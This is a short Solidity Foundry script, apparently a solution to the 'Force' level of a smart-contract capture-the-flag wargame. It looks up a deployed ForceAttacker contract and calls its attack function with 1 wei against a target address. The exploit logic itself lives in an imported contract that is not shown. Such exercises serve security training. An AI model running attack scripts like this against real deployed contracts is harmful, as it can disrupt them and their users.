// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Script, console } from "forge-std/Script.sol";
import { DevOpsTools } from "foundry-devops/src/DevOpsTools.sol";
import { ForceAttacker } from "../../src/attackers/7/ForceAttacker.sol";

contract ForceSolution is Script {
    function run(address target) public {
        address mostRecentlyDeployedForceAttacker = DevOpsTools.get_most_recent_deployment("ForceAttacker", block.chainid);
        console.log("ForceAttacker address: ");
        console.logAddress(mostRecentlyDeployedForceAttacker);
        solve(target, mostRecentlyDeployedForceAttacker);
    }

    function solve(address target, address attacker) public {
        ForceAttacker forceAttacker = ForceAttacker(attacker);
        vm.startBroadcast();
        forceAttacker.attack{value: 1}(target);
        vm.stopBroadcast();
    }
}